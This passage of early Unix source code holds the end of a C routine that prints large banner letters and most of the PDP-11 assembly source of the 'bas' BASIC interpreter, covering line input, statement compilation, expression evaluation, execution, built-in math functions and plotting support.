banner(s,bufp)
char *s;struct bann *bufp;
{
	char c,*p,*q,*r;
	p=s;
	r=bufp;
	banset(blank,bufp);

	while((c= *s++)!=0){
	  if((s-p)>chpln)return(s-p);
	  if(c>='`')c =- ' ';	/*map lower to upper case*/
	  if(c<' ')c='#';
	  if(c>'?')c=- 0100;
	  q=ctbl[c];
	  banfil(q,r);
	  r=+pospch;
	}
}

banfil(c,p)
char *c;
struct bann *p;
{
	int i,j;
	for(i=0;i<nlines;i++){
	  for(j=0;j<pospch;j++){
	    if(((c[i]<<j)&msk)!=0)p->alpha[i][j] = plot;
	  }
	}
	return(0);
}

banset(c,p)
char c;
struct bann *p;
{
	int i,j;
	for(i=0;i<nlines;i++)
	  for(j=0;j<pposs-1;j++)
	    p->alpha[i][j] = c;
}

banprt(ptr)
struct bann *ptr;
{
	int i,j;
	for(i=0;i<nlines;i++){
	  ptr->alpha[i][pposs-1]='\0';
	  for(j=pposs-2;j>=0;j--){
	    if(ptr->alpha[i][j]!=blank)break;
	    ptr->alpha[i][j]='\0';
	  }
	printf("%s\n",ptr->alpha[i]);
	}
}
-- /usr/source/s1/bas.s mode=0110664 uid=3 gid=3 atime=174922405 mtime=174845329 --
/
/

/ bas0 -- basic

scope = 1
.globl	main
.globl	sin, cos, log, exp, atan, pow, sqrt
.globl	rand, srand
.globl	fptrap
.globl fopen, getc

indir =	0  /for  indirect sys calls. (not in as)
one = 40200

main:
	mov	$1,prfile /initial print file
	sys	signal; 4; fptrap
	setd
	sys	time
	mov	r1,r0
	mov	r0,randx
	jsr	pc,srand
	sys	signal; 2; intrup
	mov	sp,gsp
	clr	seeka
	mov	$'a,r1
1:
	movb	r1,tmpf+8
	sys	stat; tmpf; line
	bes	1f
	inc	r1
	cmp	r1,$'z
	blos	1b
	br	2f
1:
	sys	creat; tmpf; 600
	bes	2f
	mov	r0,tfo
	sys	open; tmpf; 0
	bec	1f
2:
	mov	$3f,r0
	jsr	pc,print
	sys	exit
3:
	<Tmp file?\n\0>; .even
1:
	mov	r0,tfi

	mov	gsp,sp
	cmp	(sp),$2  /is there a file argument
	blt	noarg
	mov	4(sp),r0
	mov	$argname,r1
1:
	movb	(r0)+,(r1)+
	bne	1b
aftered: / after edit
	mov	$argname,r0
	jsr	r5,fopen; iobuf
	bes	1f
noarg:
	jsr	pc,isymtab
	br	loop
1:
	mov	$1f,r0
	jsr	pc,print
	br	loop
1:
	<Cannot open file\n\0>; .even

intrup:
	sys	signal; 2; intrup
	mov	$'\n,r0
	jsr	r5,xputc
	jsr	r5,error
		<ready\n\0>; .even

loop:
	mov	gsp,sp
	clr	lineno
	jsr	pc,rdline
	mov	$line,r3
1:
	movb	(r3),r0
	jsr	pc,digit
		br 1f
	jsr	r5,atoi
	cmp	r0,$' /
	beq	3f
	cmp	r0,$'	 /tab
	bne	1f
3:
	mov	$lintab,r3
	mov	r1,r0
	bgt	2f
	jsr	pc,serror
2:
	cmp	r0,(r3)
	beq	2f
	tst	(r3)
	beq	2f
	add	$6,r3
	br	2b
2:
	cmp	r3,$elintab-12.
	blo	2f
	jsr	r5,error
		<too many lines\n\0>; .even
2:
	mov	r0,(r3)+
	mov	seeka,(r3)+
	mov	tfo,r0
	mov	seeka,seekx
	sys	indir; sysseek
	mov	$line,r0
	jsr	pc,size
	inc	r0
	add	r0,seeka
	mov	r0,wlen
	mov	tfo,r0
	mov	$line,wbuf
	sys	indir;syswrit
	br	loop
1:
	mov	$line,r3
	jsr	pc,singstat
	br	loop

nextc:
	movb	(r3)+,r0
	rts	r5

size:
	clr	-(sp)
1:
	inc	(sp)
	cmpb	(r0),$'\n
	beq	1f
	cmpb	(r0),$0
	beq	1f
	inc	r0
	br	1b
1:
	mov	(sp)+,r0
	rts	pc

rdline:  / read input (file or tty) to carr. ret.
	mov	$line,r1
1:
	jsr	r5,getc; iobuf
	bes	2f
	tst	r0
	beq	2f
	cmp	r1,$line+99.
	bhis	2f			/ bad check, but a check
	movb	r0,(r1)+
	cmpb	r0,$'\n
	bne	1b
	clrb	(r1)
	rts	pc
2:
	mov	fi,r0
	beq	1f
	sys	close
	clr	fi
	br	1b
1:
	jmp	_done

error:
	tst	fi
	beq	1f
	sys	close
	clr	fi
1:
	tst	lineno
	beq	1f
	jsr	pc,nextlin
		br 1f
	mov	$line,r0
	jsr	pc,print
1:
	mov	r5,r0
	jsr	pc,print
	jmp	loop

serror:
	dec	r3
	tst	fi
	beq	1f
	sys	close
	clr	fi
1:
	mov	$line,r1
1:
	cmp	r1,r3
	bne	2f
	mov	$'_,r0
	jsr	r5,xputc
	mov	$10,r0
	jsr	r5,xputc
2:
	movb	(r1),r0
	jsr	r5,xputc
	cmpb	(r1)+,$'\n
	bne	1b
	jmp	loop

print:
	mov	r0,wbuf
	jsr	pc,size
	mov	r0,wlen
	mov	prfile,r0
	sys	indir; syswrit
	rts	pc

digit:
	cmp	r0,$'0
	blo	1f
	cmp	r0,$'9
	bhi	1f
	add	$2,(sp)
1:
	rts	pc

alpha:
	cmp	r0,$'a
	blo	1f
	cmp	r0,$'z
	bhi	1f
	add	$2,(sp)
1:
	cmp	r0,$'A
	blo	1f
	cmp	r0,$'Z
	bhi	1f
	add	$2,(sp)
1:
	rts	pc

name:
	mov	$nameb,r1
	clr	(r1)
	clr	2(r1)
1:
	cmp	r1,$nameb+4
	bhis	2f
	movb	r0,(r1)+
2:
	movb	(r3)+,r0
	jsr	pc,alpha
		br 2f
	br	1b
2:
	jsr	pc,digit
		br 2f
	br	1b
2:
	mov	$resnam,r1
1:
	cmp	nameb,(r1)
	bne	2f
	cmp	nameb+2,2(r1)
	bne	2f
	sub	$resnam,r1
	asr	r1
	add	$2,(sp)
	rts	pc
2:
	add	$4,r1
	cmp	r1,$eresnam
	blo	1b
	mov	$symtab,r1
1:
	tst	(r1)
	beq	1f
	cmp	nameb,(r1)
	bne	2f
	cmp	nameb+2,2(r1)
	bne	2f
	rts	pc
2:
	add	$14.,r1
	br	1b
1:
	cmp	r1,$esymtab-28.
	blo	1f
	jsr	r5,error
		<out of symbol space\n\0>; .even
1:
	mov	nameb,(r1)
	mov	nameb+2,2(r1)
	clr	4(r1)
	clr	14.(r1)
	rts	pc

skip:
	cmp	r0,$' /
	beq	1f
	cmp	r0,$'	  / tab
	bne	2f
1:
	movb	(r3)+,r0
	br	skip
2:
	rts	pc

xputc:
.if scope  / for plotting
	tstb	drflg
	beq	1f
	jsr	pc,drput
	rts	r5
1:
.endif
	mov	r0,ch
	mov	$1,r0
	sys	write; ch; 1
	rts	r5

nextlin:
	clr	-(sp)
	mov	$lintab,r1
1:
	tst	(r1)
	beq	1f
	cmp	lineno,(r1)
	bhi	2f
	mov	(sp),r0
	beq	3f
	cmp	(r0),(r1)
	blos	2f
3:
	mov	r1,(sp)
2:
	add	$6,r1
	br	1b
1:
	mov	(sp)+,r1
	beq	1f
	mov	(r1)+,lineno
	mov	(r1)+,seekx
	mov	tfi,r0
	sys	indir; sysseek
	mov	tfi,r0
	sys	read; line; 100.
	add	$2,(sp)
1:
	rts	pc

getloc:
	mov	$lintab,r1
1:
	tst	(r1)
	beq	1f
	cmp	r0,(r1)
	beq	2f
	add	$6,r1
	br	1b
1:
	jsr	r5,error
		<label not found\n\0>; .even
2:
	rts	pc

isymtab:
	mov	$symtab,r0
	mov	$symtnam,r1
	clrf	fr0
	movf	$one,fr1
1:
	mov	(r1)+,(r0)+
	mov	(r1)+,(r0)+
	mov	$1,(r0)+
	subf	r1,r0
	movf	r0,(r0)+
	cmp	r1,$esymtnam
	blo	1b
	clr	(r0)+
	rts	pc

/
/

/ bas1 -- compile
/
/    convention:	jsr pc,subrout /test
/				br failside
/			succeed ...

compile:
	clr	forp
	mov	$iflev,ifp /added for if..else..fi
	mov	$space,r4
	tst	lineno
	beq	1f
	rts	pc
1:
	jsr	pc,nextlin
		br 1f
	mov	lineno,r0
	jsr	pc,getloc
	mov	r4,4(r1)
	jsr	pc,statement
		br .+2
	inc	lineno
	cmp	r4,$espace+20  / out of code space?
	blo	1b
	jsr	r5,error
		<out of code space\n\0>; .even
1:
	tst	forp
	jne	forer
	cmp	ifp,$iflev
	jne	fier   /hanging if..fi
	mov	$loop,(r4)+
	rts	pc

singstat:
	clr	forp
	mov	$iflev,ifp
	mov	$exline,r4
	jsr	pc,statement
		br 1f
	cmp	-2(r4),$_asgn
	beq	1f
	mov	$_print,(r4)+
	mov	$_nline,(r4)+
1:
	tst	forp
	jne	forer
	cmp	r4,$eexline
	blo	1f
	jsr	r5,error
		<out of code space\n\0>; .even
1:
	mov	$loop,(r4)+
	mov	r4,exprloc
	mov	$exline,r4
	jmp	execute

statement:
	mov	$line,r3
	movb	(r3)+,r0
	jsr	pc,digit
		br stat1
	dec	r3
	jsr	r5,atoi
	cmp	r0,$' /
	beq	1f
	cmp	r0,$'	 /tab
	beq	1f
	mov	$line,r3
	movb	(r3)+,r0
	br	stat1
1:
	mov	$_line,(r4)+
	mov	r1,(r4)+

stat1:
	jsr	pc,skip
	cmp	r0,$'\n
	bne	.+4
	rts	pc
	mov	r3,-(sp)
	jsr	pc,alpha
		br 1f
	jsr	pc,name
		br 1f
	tst	(sp)+
	jsr	pc,skip
	dec	r3
	jmp	*2f(r1)
2:
	stlist
	stdone
	stdone
	strun
	stprint
	stprompt   / prompt is like print except for cr
	stif
	stgoto
	streturn
	stfor
	stnext
	stoctl
	stsave
	stdump
	stfi
	stelse
	stedit
	stcomment
.if scope    / for plotting on tektronix
	stdisp
	stdraw
	steras
.endif

1:
	mov	(sp)+,r3
	dec	r3
	jsr	pc,expr
	cmp	r0,$'\n
	jne	joe
	add	$2,(sp)
	rts	pc

stsave:
	mov	$_save,func
	br	1f

stlist:
	mov	$_list,func
1:
	cmp	r0,$'\n
	bne	1f
	clrf	r0
	jsr	pc,const
	movif	$77777,r0
	jsr	pc,const
	br	2f
1:
	jsr	pc,expr
	cmp	r0,$'\n
	bne	1f
	mov	$_dup,(r4)+
	br	2f
1:
	dec	r3
	jsr	pc,expr
	cmp	r0,$'\n
	jne	joe
2:
	mov	func,(r4)+
	rts	pc

stdone:
	cmp	r0,$'\n
	jne	joe
	mov	$_done,(r4)+
	rts	pc

strun:
	cmp	r0,$'\n
	jne	joe
	mov	$_run,(r4)+
	rts	pc


stprompt:
	clr	-(sp)
	br	stpr2

stdump:
	cmp	r0,$'\n
	jne	joe
	mov	$_dump,(r4)+
	rts	pc

stprint:
	mov	pc,-(sp)
stpr2:
	movb	(r3)+,r0
	jsr	pc,skip
1:
	cmp	r0,$'\n
	beq	2f
	cmp	r0,$'"
	beq	1f
	dec	r3
	jsr	pc,expr
	mov	$_print,(r4)+
	br	1b
1:
	mov	$_ascii,(r4)+
1:
	movb	(r3)+,(r4)
	cmpb	(r4),$'"
	beq	1f
	cmpb	(r4)+,$'\n
	bne	1b
	jbr	joe
1:
	add	$2,r4
	bic	$1,r4
	br	stpr2
2:
	tst	(sp)+
	beq	1f
	mov	$_nline,(r4)+
1:
	rts	pc

stif:
	jsr	pc,expr
	mov	$_if,(r4)+
	mov	r4,*ifp
	add	$2,ifp
	tst	(r4)+
	jsr	pc,skip
	cmp	r0,$'\n   / if ... fi
	beq	1f
	jsr	pc,stat1
		br  .+2
stfi:
	sub	$2,ifp
	cmp	ifp,$iflev
	jlo	fier
	mov	*ifp,r1  /for jump around if
	mov	r4,(r1)
1:
	rts	pc

fier:
	jsr	r5,error; <if...else...fi imbalance\n\0>; .even

stelse:
	mov	$_tra,(r4)+  /jump around else side
	mov	r4+,-(sp) / save hole
	tst	(r4)+
	sub	$2,ifp
	cmp	ifp,$iflev
	jlo	fier
	mov	*ifp,r1
	mov	r4,(r1)  /fill in jump to else
	mov	(sp)+,*ifp /save hole for fi
	add	$2,ifp
	rts	pc

stedit:  / enter the regular editor <ed>
	sys fork
	br	newpr
	mov	$lintab,r0  / zero out line table during edit
1:
	cmp	r0,$elintab  /done
	beq	1f
	mov	$0,(r0)+
	br	1b
1:
	sys	unlink; tmpf
	sys	wait
	jmp	aftered / start over
newpr:
	sys	exec; ed; edarg
	sys	exit
ed:	</bin/ed\0> ; .even
ednm:	<-\n>
 .even
edarg:	ednm; argname; 0

stcomment:  /comment line
	cmp	r0,$'\n
	beq	1f
	movb	(r3)+,r0
	br	stcomment
1:
	rts	pc
stgoto:
	jsr	pc,expr
	mov	$_goto,(r4)+
	rts	pc

streturn:
	cmp	r0,$'\n
	beq	1f
	jsr	pc,expr
	cmp	r0,$'\n
	bne	joe
	br	2f
1:
	clrf	r0
	jsr	pc,const
2:
	mov	$_return,(r4)+
	rts	pc

joe:
	jsr	pc,serror

stfor:
	mov	r4,-(sp)
	jsr	pc,e2
	mov	r4,-(sp)
	cmp	r0,$'=
	bne	joe
	tst	val
	bne	joe
	jsr	pc,expr
	mov	forp,(r4)+	/ overlay w _asgn
	mov	r4,forp
	cmp	(r4)+,(r4)+	/ _tra ..
	mov	(sp)+,r0
	mov	(sp)+,r1
1:
	mov	(r1)+,(r4)+
	cmp	r1,r0
	blo	1b
	mov	$_fori,(r4)+
	mov	forp,r1
	mov	$_tra,(r1)+
	mov	r4,(r1)+
	dec	r3
	jsr	pc,expr
	mov	$_lesseq,(r4)+
	mov	$_if,(r4)+
	mov	forp,(r4)+
	mov	r4,forp
	cmp	r0,$'\n
	beq	1f
	jsr	pc,stat1
		br .+2
	br	stnext
1:
	rts	pc

forer:
	jsr	r5,error; <for/next imbalance\n\0>; .even

stnext:
	mov	forp,r1
	beq	forer
	mov	-(r1),r0
	mov	-(r0),forp
	mov	$_ptra,(r4)+
	mov	$_asgn,(r0)+
	cmp	(r0)+,(r0)+
	mov	r0,(r4)+
	mov	r4,(r1)+
	rts	pc

stoctl:
	jsr	pc,expr
	mov	$_octal,(r4)+
	rts	pc

.if scope  / for plotting
stdisp:
	mov	$_sdisp,(r4)+
	jsr	pc,stprint
	mov	$_fdisp,(r4)+
	rts	pc
stdraw:
	jsr	pc,expr
	dec	r3
	jsr	pc,expr
	cmp	r0,$'\n
	bne	1f
	movf	$one,r0
	jsr	pc,const
	br	2f
1:
	dec	r3
	jsr	pc,expr
2:
	mov	$_draw,(r4)+
	rts	pc

steras:
	mov	$_erase,(r4)+
	rts	pc
.endif

/
/

/ bas2 -- expression evaluation

expr:
	jsr	pc,e1
	jsr	pc,rval
	rts	pc

/ assignment right to left
e1:
	jsr	pc,e2
	cmp	r0,$'=
	beq	1f
	jsr	pc,rval
	rts	pc
1:
	tst	val
	beq	1f
	jsr	pc,serror
1:
	jsr	pc,e1
	jsr	r5,op; _asgn
	rts	pc

/ and or left to right
e2:
	jsr	pc,e3
1:
	cmp	r0,$'&
	beq	2f
	cmp	r0,$'|
	beq	3f
	rts	pc
2:
	jsr	pc,rval
	jsr	pc,e3
	jsr	r5,op; _and
	br	1b
3:
	jsr	pc,rval
	jsr	pc,e3
	jsr	r5,op; _or
	br	1b

/ relation extended relation
e3:
	jsr	pc,e4
	jsr	pc,e3a
		rts pc
	clr	-(sp)
1:
	mov	r0,-(sp)
	jsr	pc,e4
	jsr	pc,rval
	mov	(sp)+,(r4)+
	jsr	pc,e3a
		br 1f
	mov	$_extr,(r4)+
	inc	(sp)
	br	1b
1:
	dec	(sp)
	blt	1f
	mov	$_and,(r4)+
	br	1b
1:
	tst	(sp)+
	rts	pc

/ relational operator
e3a:
	cmp	r0,$'>
	beq	1f
	cmp	r0,$'<
	beq	2f
	cmp	r0,$'=
	beq	3f
	rts	pc
1:
	mov	$_great,r0
	cmpb	(r3),$'=
	bne	1f
	inc	r3
	mov	$_greateq,r0
	br	1f
2:
	cmpb	(r3),$'>
	bne	2f
	inc	r3
	mov	$_noteq,r0
	br	1f
2:
	mov	$_less,r0
	cmpb	(r3),$'=
	bne	1f
	inc	r3
	mov	$_lesseq,r0
	br	1f
3:
	cmpb	(r3),$'=
	beq	2f
	rts	pc
2:
	inc	r3
	mov	$_equal,r0
1:
	jsr	pc,rval
	add	$2,(sp)
	rts	pc

/ add subtract
e4:
	jsr	pc,e5
1:
	cmp	r0,$'+
	beq	2f
	cmp	r0,$'-
	beq	3f
	rts	pc
2:
	jsr	pc,rval
	jsr	pc,e5
	jsr	r5,op; _add
	br	1b
3:
	jsr	pc,rval
	jsr	pc,e5
	jsr	r5,op; _sub
	br	1b

/ multiply divide
e5:
	jsr	pc,e6
1:
	cmp	r0,$'*
	beq	2f
	cmp	r0,$'/
	beq	3f
	rts	pc
2:
	jsr	pc,rval
	jsr	pc,e6
	jsr	r5,op; _mult
	br	1b
3:
	jsr	pc,rval
	jsr	pc,e6
	jsr	r5,op; _divid
	br	1b

/ exponential
e6:
	jsr	pc,e6a
1:
	cmp	r0,$'^
	beq	2f
	rts	pc
2:
	jsr	pc,rval
	jsr	pc,e6a
	jsr	r5,op; _expon
	br	1b

e6a:
	movb	(r3)+,r0
	jsr	pc,skip
	cmp	r0,$'_
	bne	1f
	jsr	pc,e6a
	jsr	r5,op; _neg
	rts	pc
1:
	dec	r3
	jsr	pc,e7
	rts	pc
/ end of unary -

/ primary
e7:
	movb	(r3)+,r0
	jsr	pc,skip
	mov	$1,val
	cmp	r0,$'(
	bne	1f
	jsr	pc,e1
	cmp	r0,$')
	bne	2f
	movb	(r3)+,r0
	br	e7a
2:
	jsr	pc,serror
1:
	cmp	r0,$'.
	beq	2f
	jsr	pc,digit
		br 1f
2:
	dec	r3
	jsr	r5,atof; nextc
	jsr	pc,const
	br	e7a
1:
	jsr	pc,alpha
		br jim
	jsr	pc,name
		br 2f
	jsr	r5,error; <reserved name\n\0>; .even
2:
/ try to fix illegal symbol bug:
	cmp	r4,$eexline
	bhis	jim

	mov	$_lval,(r4)+
	mov	r1,(r4)+
	clr	val
	br	e7a
jim:
	jsr	pc,serror

e7a:
	jsr	pc,skip
	cmp	r0,$'(
	bne	1f
	jsr	pc,rval
	jsr	r5,rlist; _funct
	cmp	r0,$')
	bne	jim
	movb	(r3)+,r0
	br	e7a
1:
	cmp	r0,$'[
	bne	1f
	tst	val
	beq	2f
	jsr	pc,serror
2:
	jsr	r5,rlist; _subscr
	clr	val
	cmp	r0,$']
	bne	jim
	movb	(r3)+,r0
	br	e7a
1:
	rts	pc

op:
	jsr	pc,rval
	mov	(r5)+,(r4)+
	rts	r5

rval:
	tst	val
	bne	1f
	mov	$_rval,(r4)+
	inc	val
1:
	rts	pc

const:
	mov	r0,-(sp)
	movf	r1,-(sp)
	tstf	r0
	cfcc
	bne	1f
	mov	$_con0,(r4)+
	br	2f
1:
	cmpf	$one,r0
	cfcc
	bne	1f
	mov	$_con1,(r4)+
	br	2f
1:
	movfi	r0,r0
	movif	r0,r1
	cmpf	r0,r1
	cfcc
	bne	1f
	mov	$_intcon,(r4)+
	mov	r0,(r4)+
	br	2f
1:
	mov	$_const,(r4)+
	movf	r0,(r4)+
2:
	movf	(sp)+,r1
	mov	(sp)+,r0
	rts	pc

rlist:
	clr	-(sp)
	cmpb	(r3),$')
	bne	1f
	movb	(r3)+,r0
	br	2f
1:
	inc	(sp)
	jsr	pc,expr
	cmp	r0,$',
	beq	1b
2:
	mov	(r5)+,(r4)+
	mov	(sp)+,(r4)+
	rts	r5

/
/
/ bas3 -- execution

execute:
	mov	$estack,r3
	mov	r3,sstack
	jmp	*(r4)+

_if:
	tstf	(r3)+
	cfcc
	beq	_tra
	tst	(r4)+
	jmp	*(r4)+

_ptra:
	mov	sstack,r3

_tra:
	mov	(r4)+,r4
	jmp	*(r4)+

_funct:
	mov	r4,-(r3)
	mov	sstack,-(r3)
	mov	r3,sstack
	inc	sublev
	clr	r0
	jsr	pc,arg
	tstf	r0
	cfcc
	bge	1f
	jmp	builtin

_goto:
	movf	(r3),r0
1:
	movfi	r0,-(sp)
	jsr	pc,compile
	mov	(sp)+,r0
	jsr	pc,getloc
	mov	4(r1),r4
	jmp	*(r4)+

_run:
	jsr	pc,isymtab
	mov	randx,r0
	jsr	pc,srand
	jsr	pc,compile
	mov	$space,r4
	jmp	*(r4)+

_save:    / _save is a _list to the file named on the bas command
	sys	creat; argname; 666
	bes	1f
	mov	r0,prfile
	br	2f
1:
	mov	1f,r0
	mov	$1,prfile
	jsr	pc,print
	br	_done
1:	<Cannot create b.out\n\0>; .even

_list:
	mov	$1,prfile
2:
	movf	(r3)+,r0
	movfi	r0,-(sp)
/ probably vistigal?? 	mov	r3,0f
	movf	(r3),r0
	movfi	r0,lineno
1:
	jsr	pc,nextlin
		br 1f
	cmp	lineno,(sp)
	bhi	1f
	mov	$line,r0
	jsr	pc,print
	inc	lineno
	br	1b
1:
	cmp	$1,prfile
	beq	1f
	mov	prfile,r0
	sys	close
	mov	$1,prfile
1:
	tst	(sp)+
	jmp	*(r4)+

_done:
	sys	unlink; tmpf
	sys	exit

.if scope  / for plotting
_sdisp:
	mov	$2,r0
	jsr	pc,drput
	jsr	pc,drxy
	mov	$1,r0
	jsr	pc,drput
	mov	$3,r0
	jsr	pc,drput
	incb	drflg
	jmp	*(r4)+

_fdisp:
	clr	r0
	jsr	pc,drput
	clrb	drflg
	jmp	*(r4)+

_draw:
	movf	(r3)+,r2
	movf	(r3)+,r1
	movf	(r3)+,r0
	jsr	r5,draw
	jmp	*(r4)+

_erase:
	mov	$1,r0
	jsr	pc,drput
	mov	$1,r0
	jsr	pc,drput
	jmp	*(r4)+
.endif

_print:
	movf	(r3)+,r0
	jsr	r5,ftoa; xputc
	jmp	*(r4)+

_octal:
	movf	(r3)+,r0
	jsr	r5,ftoo; xputc
	jmp	*(r4)+

_nline:
	mov	$'\n,r0
	jsr	r5,xputc
	jmp	*(r4)+

_ascii:
	movb	(r4)+,r0
	cmp	r0,$'"
	beq	1f
	jsr	r5,xputc
	br	_ascii
1:
	inc	r4
	bic	$1,r4
	jmp	*(r4)+

_line:
	mov	sstack,r3
	cmp	r3,$stack+20.
	bhi	1f
	jsr	r5,error
		<out of space\n\0>; .even
1:
	mov	(r4)+,lineno
	jmp	*(r4)+

_or:
	tstf	(r3)+
	cfcc
	bne	stone
	tstf	(r3)
	cfcc
	bne	stone
	br	stzero

_and:
	tstf	(r3)+
	cfcc
	beq	stzero
	tstf	(r3)
	cfcc
	beq	stzero
	br	stone

_great:
	jsr	pc,bool
	bgt	stone
	br	stzero

_greateq:
	jsr	pc,bool
	bge	stone
	br	stzero

_less:
	jsr	pc,bool
	blt	stone
	br	stzero

_lesseq:
	jsr	pc,bool
	ble	stone
	br	stzero

_noteq:
	jsr	pc,bool
	bne	stone
	br	stzero

_equal:
	jsr	pc,bool
	beq	stone

stzero:
	clrf	r0
	br	advanc

stone:
	movf	$one,r0
	br	advanc

_extr:
	movf	r1,r0		/ dup for _and in extended rel
	br	subadv

_asgn:
	movf	(r3)+,r0
	mov	(r3)+,r0
	add	$4,r0
	bis	$1,(r0)+
	movf	r0,(r0)
	br	subadv

_add:
	movf	(r3)+,r0
	addf	(r3),r0
	br	advanc

_sub:
	movf	(r3)+,r0
	negf	r0
	addf	(r3),r0
	br	advanc

_mult:
	movf	(r3)+,r0
	mulf	(r3),r0
	br	advanc

_divid:
	movf	(r3)+,r1
	movf	(r3),r0
	divf	r1,r0
	br	advanc

_expon:
	movf	(r3)+,fr1
	movf	(r3),fr0
	jsr	pc,pow
	bec	advanc
	jsr	r5,error
		<Bad exponentiation\n\0>; .even

_neg:  / unary -
	negf	r0
	jbr	advanc
/ end of _neg

_intcon:
	movif	(r4)+,r0
	jbr	subadv

_con0:
	clrf	r0
	jbr	subadv

_con1:
	movf	$one,r0
	jbr	subadv

_const:
	movf	(r4)+,r0

subadv:
	movf	r0,-(r3)
	jmp	*(r4)+

advanc:
	movf	r0,(r3)
	jmp	*(r4)+

_rval:
	jsr	pc,getlv
	br	subadv

_fori:
	jsr	pc,getlv
	addf	$one,r0
	movf	r0,(r0)
	br	subadv

_lval:
	mov	(r4)+,-(r3)
	jmp	*(r4)+

_dup:
	movf	(r3),r0
	br	subadv

_return:
	dec	sublev
	bge	1f
	jsr	r5,error
		<bad return\n\0>; .even
1:
	movf	(r3),r0
	mov	sstack,r3
	mov	(r3)+,sstack
	mov	(r3)+,r4
	mov	(r4)+,r0
1:
	dec	r0
	blt	advanc
	add	$8,r3
	br	1b

_subscr:
	mov	(r4),r1
	mpy	$8.,r1
	add	r1,r3
	mov	r3,-(sp)
	mov	(r3),r0
	mov	(r4)+,-(sp)
1:
	dec	(sp)
	blt	1f
	movf	-(r3),r0
	movfi	r0,r2
	com	r2
	blt	2f
	jsr	r5,error
		<subscript out of range\n\0>; .even
2:
	mov	r0,r1
	mov	4(r0),r0
	bic	$1,r0
2:
	beq	2f
	cmp	r2,(r0)+
	bne	3f
	tst	-(r0)
	br	1b
3:
	mov	(r0),r0
	br	2b
2:
	mov	$symtab,r0
2:
	tst	(r0)
	beq	2f
	add	$14.,r0
	br	2b
2:
	cmp	r0,$esymtab-28.
	blo	2f
	jsr	r5,error
		<out of symbol space\n\0>; .even
2:
	cmp	(r1)+,(r1)+
	mov	r0,-(sp)
	clr	14.(r0)
	mov	r2,(r0)+
	mov	(r1),r2
	bic	$1,r2
	mov	r2,(r0)+
	clr	(r0)+
	mov	(sp)+,r0
	bic	$!1,(r1)
	bis	r0,(r1)
	br	1b
1:
	tst	(sp)+
	mov	(sp)+,r3
	mov	r0,(r3)
	jmp	*(r4)+

bool:
	movf	(r3)+,r1	/ r1 used in extended rel
	cmpf	(r3),r1
	cfcc
	rts	pc

getlv:
	mov	(r3)+,r0
	add	$4,r0
	bit	$1,(r0)+
	bne	1f
	jsr	r5,error;<used before set\n\0>; .even
1:
	movf	(r0),r0
	rts	pc

/
/

/ bas4 -- builtin functions

builtin:
	dec	sublev
	mov	(r3)+,sstack
	mov	(r3)+,r4
	movfi	r0,r0
	com	r0
	asl	r0
	cmp	r0,$2f-1f
	bhis	2f
	jmp	*1f(r0)
1:
	fnarg
	fnexp
	fnlog
	fnsin
	fncos
	fnatan
	fnrand
	fnexpr
	fnint
	fnabs
	fnsqr
2:
	mov	$-1,r0
	jsr	pc,getloc		/ label not found diagnostic

fnarg:
	cmp	(r4)+,$1
	bne	narg
	movf	(r3),r0
	movfi	r0,r0
	jsr	pc,arg
	br	fnadvanc

fnexp:
	jsr	r5,fnfn; exp
	br	fnadvanc

fnlog:
	jsr	r5,fnfn; log
	bec	fnadvanc
	jsr	r5,error
		<Bad log\n\0>; .even

fnsin:
	jsr	r5,fnfn; sin
	bec	fnadvanc
	jsr	r5,error
		<Bad sine\n\0>; .even

fncos:
	jsr	r5,fnfn; cos
	bec	fnadvanc
	jsr	r5,error
		<Bad cosine\n\0>; .even

fnatan:
	jsr	r5,fnfn; atan
	bec	fnadvanc
	jsr	r5,error
		<Bad arctangent\n\0>; .even

fnrand:
	tst	(r4)+
	bne	narg
	jsr	pc,rand
	movif	r0,r0
	divf	$44000,r0
	jmp	advanc

fnexpr:
	tst	(r4)+
	bne	narg
	mov	r3,-(sp)
	mov	r4,-(sp)
	jsr	pc,rdline
	mov	exprloc,r4
	mov	$line,r3
	jsr	pc,expr
	mov	$_tra,(r4)+
	mov	(sp)+,(r4)+
	mov	(sp)+,r3
	mov	exprloc,r4
	add	$8,r3
	jmp	*(r4)+

fnint:
	cmp	(r4)+,$1
	bne	narg
	movf	(r3),r0
	modf	$one,r0
	movf	r1,r0
	br	fnadvanc

fnabs:
	cmp	(r4)+,$1
	bne	narg
	movf	(r3),r0
	cfcc
	bge	fnadvanc
	negf	r0
	br	fnadvanc

fnsqr:
	jsr	r5,fnfn; sqrt
	bec	fnadvanc
	jsr	r5,error
	<Bad square root arg\n\0>; .even
fnadvanc:
	add	$8,r3
	jmp	advanc

narg:
	jsr	r5,error
		<arg count\n\0>; .even

arg:
	tst	sublev
	beq	1f
	mov	sstack,r1
	sub	*2(r1),r0
	bhi	1f
2:
	inc	r0
	bgt	2f
	add	$8,r1
	br	2b
2:
	movf	4(r1),r0
	rts	pc
1:
	jsr	r5,error
		<bad arg\n\0>; .even

fnfn:
	cmp	(r4)+,$1
	bne	narg
	movf	(r3),r0
	jsr	pc,*(r5)+
	rts	r5

.if scope / for plotting
draw:
	tstf	r2
	cfcc
	bne	1f
	movf	r0,drx
	movf	r1,dry
	rts	r5
1:
	movf	r0,-(sp)
	movf	r1,-(sp)
	mov	$3,r0
	jsr	pc,drput
	jsr	pc,drxy
	movf	(sp)+,r0
	movf	r0,dry
	movf	(sp)+,r0
	movf	r0,drx
	jsr	pc,drxy
	rts	r5

drxy:
	movf	drx,r0
	jsr	pc,drco
	movf	dry,r0

drco:
	tstf	r0
	cfcc
	bge	1f
	clrf	r0
1:
	cmpf	$40200,r0		/ 1.0
	cfcc
	bgt	1f
	movf	$40177,r0		/ 1.0-eps
1:
	subf	$40000,r0		/ .5
	mulf	$43200,r0		/ 4096
	movfi	r0,r0
	mov	r0,-(sp)
	jsr	pc,drput
	mov	(sp)+,r0
	swab	r0

drput:
	movb	r0,ch
	mov	drfo,r0
	bne	1f
	sys	open; vt; 1
	bec	2f
	4
2:
	mov	r0,drfo
1:
	sys	write; ch; 1
	rts	pc

.endif
/ bas4 -- old library routines
atoi:
	clr	r1
	jsr	r5,nextc
	clr	-(sp)
	cmp	r0,$'-
	bne	2f
	inc	(sp)
1:
	jsr	r5,nextc
2:
	sub	$'0,r0
	cmp	r0,$9
	bhi	1f
	mpy	$10.,r1
	bcs	3f / >32k
	add	r0,r1
	bcs	3f / >32k
	br	1b
1:
	add	$'0,r0
	tst	(sp)+
	beq	1f
	neg	r1
1:
	rts	r5
3:
	tst	(sp)+
	mov	$'.,r0  / faking overflow
	br	1b

ldfps = 170100^tst
stfps = 170200^tst
atof:
	stfps	-(sp)
	ldfps	$200
	movf	fr1,-(sp)
